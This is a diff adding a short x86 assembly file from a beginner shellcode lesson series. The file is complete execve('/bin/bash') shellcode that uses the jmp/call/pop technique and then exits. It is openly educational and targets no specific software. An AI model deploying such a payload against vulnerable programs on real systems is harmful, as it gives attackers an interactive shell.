@@ -1,0 +1,36 @@
+;
+; part of my shellcode for noobs lesson series hosted in #goatzzz on irc.enigmagroup.org
+;
+; ----------------------------------------------------------------------------
+; "THE BEER-WARE LICENSE" (Revision 43):
+; <aaronryool@gmail.com> wrote this file. As long as you retain this notice you
+; can do whatever you want with this stuff. If we meet some day, and you think
+; this stuff is worth it, you can buy me a beer in return Aaron R. Yool
+; ----------------------------------------------------------------------------
+; 32bit call: eax args: ebx, ecx, edx, esi, edi, and ebp
+
+[bits 32]
+section .text
+global _start
+_start:
+; execve("/bin/bash",$esp,0)
+	xor eax,eax
+	mov al,0x0b
+	jmp short sh
+load_sh:
+	pop esi
+	xor edx,edx
+	push edx
+	push esi
+	mov	ecx,esp
+	mov	ebx,esi
+	int 0x80
+; exit(0);
+	xor eax,eax
+	mov al,0x1
+	xor ebx,ebx
+	int 0x80
+
+sh:
+	call load_sh
+	db "/bin/bash"
